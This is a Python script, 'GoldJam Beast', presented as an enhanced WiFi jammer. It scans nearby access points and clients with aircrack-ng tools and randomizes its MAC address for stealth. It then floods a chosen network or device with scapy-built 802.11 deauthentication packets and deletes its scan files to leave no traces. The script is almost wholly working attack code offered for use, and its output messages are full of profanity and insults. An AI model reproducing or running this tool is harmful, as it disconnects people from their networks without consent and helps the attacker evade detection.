#!/usr/bin/env python3

# GoldJam Beast - Enhanced WiFi Jammer
# Author: GoldSkull-777, souped up by uVGptx
# Upgrades: Multithreaded scanning, client targeting, stealth, channel hopping

import os
import subprocess
import time
import sys
import shutil
import signal
import threading
import random
from scapy.all import *
from rich import print
from rich.table import Table
from rich.live import Live

# ==================== Auto Dependency Installer ====================
def install_if_missing():
    def is_installed(cmd):
        return shutil.which(cmd) is not None

    def apt_install(pkg):
        subprocess.call(f"sudo apt-get install -y {pkg}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def pip_install(pkg):
        subprocess.call(f"python3 -m pip install {pkg}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print("[bold green][+] Checking dependencies...[/bold green]")
    if not is_installed("airmon-ng"):
        print("[bold red][!] Installing aircrack-ng suite...[/bold red]")
        apt_install("aircrack-ng")
    if not is_installed("macchanger"):
        print("[bold red][!] Installing macchanger for stealth...[/bold red]")
        apt_install("macchanger")
    try:
        import rich
    except ImportError:
        print("[bold red][!] Installing Python module 'rich'...[/bold red]")
        pip_install("rich")
    try:
        import scapy
    except ImportError:
        print("[bold red][!] Installing Python module 'scapy'...[/bold red]")
        pip_install("scapy")

install_if_missing()

# ==================== Utility ====================
def clear(): os.system('clear' if os.name == 'posix' else 'cls')
def run(cmd): 
    try:
        return subprocess.getoutput(cmd)
    except:
        return ""

def get_interfaces():
    interfaces = run("iw dev | awk '$1==\"Interface\"{print $2}'").splitlines()
    if not interfaces:
        print("[bold red][-] No wireless interfaces found. Fuck off.[/bold red]")
        sys.exit(1)
    return interfaces

def enable_monitor(iface):
    print(f"\n[bold green][+] Enabling monitor mode on {iface}...[/bold green]")
    try:
        subprocess.call("sudo airmon-ng check kill", shell=True)
        subprocess.call(f"sudo airmon-ng start {iface}", shell=True)
        time.sleep(1)
        # Stealth: Randomize MAC address
        run(f"sudo ifconfig {iface} down")
        run(f"sudo macchanger -r {iface}")
        run(f"sudo ifconfig {iface} up")
        print(f"[bold green][+] MAC randomized for {iface}. Stay sneaky, you fuck.[/bold green]")
        return iface
    except Exception as e:
        print(f"[bold red][-] Failed to enable monitor mode: {e}. Shit’s broken.[/bold red]")
        sys.exit(1)

def restore(iface):
    print("\n[bold green][+] Restoring {iface} to managed mode...[/bold green]")
    try:
        run(f"sudo ifconfig {iface} down")
        run(f"sudo iwconfig {iface} mode managed")
        run(f"sudo ifconfig {iface} up")
        run("sudo systemctl start NetworkManager")
        run("sudo systemctl start wpa_supplicant")
        print("[bold green][+] Adapter restored. You’re clean, you bastard.[/bold green]")
    except Exception as e:
        print(f"[bold red][-] Restore failed: {e}. Fix your shit.[/bold red]")

def cleanup(file):
    for ext in ["csv", "cap", "netxml"]:
        if os.path.exists(f"{file}-01.{ext}"):
            os.remove(f"{file}-01.{ext}")
    print("[bold green][+] Cleaned up temp files. No traces, you sly fuck.[/bold green]")

# ==================== Channel Hopper ====================
def channel_hopper(iface):
    channels = [1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13]
    while True:
        for ch in channels:
            run(f"sudo iwconfig {iface} channel {ch}")
            time.sleep(0.3)

# ==================== CSV Parser ====================
def parse_networks(file):
    nets = []
    try:
        with open(f"{file}-01.csv", 'r', errors='ignore') as f:
            lines = f.read().split("\n\n")[0].splitlines()[2:]
            for l in lines:
                c = l.split(',')
                if len(c) > 13 and c[0].strip() and len(c[0].strip()) == 17:
                    essid = c[13].strip() if c[13].strip() != '' else '(Hidden)'
                    nets.append({'bssid': c[0].strip(), 'ch': c[3].strip(), 'pwr': c[8].strip(), 'essid': essid})
    except:
        pass
    return nets

# ==================== Client Scanner ====================
def scan_clients(iface, bssid, ch):
    clients = []
    print(f"\n[bold cyan][+] Scanning for clients on BSSID {bssid} (CH {ch})...[/bold cyan]")
    run(f"sudo iwconfig {iface} channel {ch}")
    cmd = ["sudo", "airodump-ng", "--bssid", bssid, "--write", "goldjam_clients", "--output-format", "csv", iface]
    process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
    try:
        time.sleep(10)  # Scan for clients briefly
        with open("goldjam_clients-01.csv", 'r', errors='ignore') as f:
            lines = f.read().split("\n\n")[1].splitlines()[2:]  # Client section
            for l in lines:
                c = l.split(',')
                if len(c) > 5 and c[0].strip() and len(c[0].strip()) == 17:
                    clients.append(c[0].strip())
    except:
        pass
    finally:
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
    return clients

# ==================== Live Scan ====================
def live_scan(iface, file):
    print(f"\n[bold cyan][+] Starting live scan on [bold yellow]{iface}[/bold yellow].[/bold cyan]")
    print("[bold green][*] PRESS [CTRL + C] when your target appears.[/bold green]")
    print("[bold magenta][*] Tip: Let it run for 10-15s for better detection.[/bold magenta]\n")

    # Start channel hopper in background
    hopper = threading.Thread(target=channel_hopper, args=(iface,), daemon=True)
    hopper.start()

    cmd = ["sudo", "airodump-ng", "--write", file, "--output-format", "csv", iface]
    process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)

    try:
        with Live(refresh_per_second=1, screen=True) as live:
            while True:
                table = Table(title="[bold magenta]📡 GoldJam Beast Scan — Nearby WiFi Networks[/bold magenta]", show_header=True, header_style="bold blue")
                table.add_column("No", style="bold yellow", justify="center")
                table.add_column("ESSID", style="cyan", overflow="fold")
                table.add_column("BSSID", style="red")
                table.add_column("CH", style="magenta", justify="center")
                table.add_column("PWR", style="green", justify="center")

                nets = parse_networks(file)
                if nets:
                    for idx, n in enumerate(nets):
                        table.add_row(str(idx+1), n['essid'], n['bssid'], n['ch'], n['pwr'])
                else:
                    table.add_row("-", "[yellow]Scanning...[/yellow]", "-", "-", "-")
                live.update(table)
                time.sleep(1)
    except KeyboardInterrupt:
        print("\n[bold green][+] Scan stopped. Processing networks...[/bold green]")
    finally:
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
        time.sleep(1)

# ==================== Deauth Attack ====================
def deauth_all(bssid, ch, iface, client=None):
    run(f"sudo iwconfig {iface} channel {ch}")
    log_file = f"goldjam_log_{int(time.time())}.txt"
    print(f"\n[bold red][+] Launching jammer on BSSID: {bssid} (CH {ch})[/bold red]")
    if client:
        print(f"[bold red][+] Targeting client: {client}[/bold red]")
    print("[bold yellow][*] PRESS [CTRL + C] to stop jamming.[/bold yellow]")
    print(f"[bold magenta][*] Logging attack details to {log_file}.[/bold magenta]\n")

    with open(log_file, 'a') as f:
        f.write(f"[*] Attack started: {time.ctime()}\n")
        f.write(f"[*] Target BSSID: {bssid}, Channel: {ch}\n")
        if client:
            f.write(f"[*] Target Client: {client}\n")

    # Use scapy for precise deauth packets
    pkt = RadioTap()/Dot11(addr1=client or "ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)/Dot11Deauth()
    try:
        while True:
            sendp(pkt, iface=iface, count=10, inter=0.1, verbose=False)
            with open(log_file, 'a') as f:
                f.write(f"[*] Sent deauth burst at {time.ctime()}\n")
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[bold cyan][+] Jam stopped by user.[/bold cyan]")
        with open(log_file, 'a') as f:
            f.write(f"[*] Attack stopped: {time.ctime()}\n")

# ==================== Banner ====================
SKULL = """
[bold red]
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+-........:=*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%=:..            ...-#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ do not edit this line
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*..................    ..=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%:.....:+%@@@@@@@@@@%*-......#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#....-*@@@@@@@%##%%@@@@@@#=....=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#...-%@@@@*:..........:+%@@@@=...=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:..:@@@%:.................#@@@=...*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*....-+:....:*@@@@@@@@#-.....==.. .:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=.. ......:%@@@@@%#%@@@@%=........ :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+...     .+@@#:......:*@@#..       -@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#.....  ....................  .....+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@...:...  ..  .-#@@%=..     ...:...#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=...-:.      -@@@@@@+.     ..=...:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*..==..    ..-@@@@@@+.     ..-*..+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+......:::...:#%%%=...:::......=%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%:..=#@@@@@@@@#:.....*@@@@@@@@%+:.:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+..#@@@@@@@@@@@-.  .:@@@@@@@@@@@%:.:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:.-@@@@@@@@@@@%.. .+@@@@@@@@@@@*..#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%:.-@@@@@@@@@@*:.....+%@@@@@@@@@*..*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@....-#@@@#+-:...:##-....-=*%@@#=....%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+...............@@@@-..............:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-.... ..    .*@##@%..     .....:#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#=--=-...  .=@+-@*.. ...-+=--*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-.  ......... .:#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#:.            ..*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#:.....   .....+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#++:..:.:=+*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

               GoldJam Beast - WiFi Jammer
                Author: GoldSkull-777, Enhanced by uVGptx
[/bold red]
"""

# ==================== Main ====================
def main():
    clear()
    print(SKULL)

    interfaces = get_interfaces()
    for i, iface in enumerate(interfaces):
        print(f"[bold green][{i+1}] {iface}[/bold green]")
    while True:
        try:
            s = input("\n[+] Select interface number to use: ").strip()
            if s.isdigit() and 1 <= int(s) <= len(interfaces):
                iface = interfaces[int(s)-1]
                break
            print("[bold red][-] Invalid choice, you dumb fuck. Try again.[/bold red]")
        except:
            print("[bold red][-] Input error. Numbers only, asshole.[/bold red]")

    iface = enable_monitor(iface)
    file = "goldjam_scan"

    live_scan(iface, file)

    nets = parse_networks(file)
    if not nets:
        print("[bold red][-] No networks found. Clean up and fuck off.[/bold red]")
        cleanup(file)
        restore(iface)
        return

    print("\n[bold magenta]Available Networks:[/bold magenta]")
    print("%-3s %-25s %-20s %-5s %-6s" % ("No", "ESSID", "BSSID", "CH", "PWR"))
    print("-"*70)
    for i, n in enumerate(nets):
        print("%-3s %-25s %-20s %-5s %-6s" % (str(i+1), n['essid'], n['bssid'], n['ch'], n['pwr']))

    while True:
        try:
            s = input("\n[+] Select target network number to jam: ").strip()
            if s.isdigit() and 1 <= int(s) <= len(nets):
                n = nets[int(s)-1]
                break
            print("[bold red][-] Invalid choice, you dumb fuck. Try again.[/bold red]")
        except:
            print("[bold red][-] Input error. Numbers only, asshole.[/bold red]")

    # Client targeting option
    client = None
    if input("\n[+] Scan for specific clients to target? (y/n): ").strip().lower() == 'y':
        clients = scan_clients(iface, n['bssid'], n['ch'])
        if clients:
            print("\n[bold magenta]Available Clients:[/bold magenta]")
            print("%-3s %-20s" % ("No", "MAC Address"))
            print("-"*30)
            for i, c in enumerate(clients):
                print("%-3s %-20s" % (str(i+1), c))
            while True:
                try:
                    s = input("\n[+] Select client number to jam (0 for all): ").strip()
                    if s.isdigit() and 0 <= int(s) <= len(clients):
                        client = clients[int(s)-1] if int(s) > 0 else None
                        break
                    print("[bold red][-] Invalid choice, you dumb fuck. Try again.[/bold red]")
                except:
                    print("[bold red][-] Input error. Numbers only, asshole.[/bold red]")
        else:
            print("[bold red][-] No clients found. Jamming all devices.[/bold red]")

    deauth_all(n['bssid'], n['ch'], iface, client)
    cleanup(file)
    restore(iface)
    print("\n[bold green][+] GoldJam Beast session complete. Stay ruthless, you fuck.[/bold green]\n")

if __name__ == '__main__':
    main()
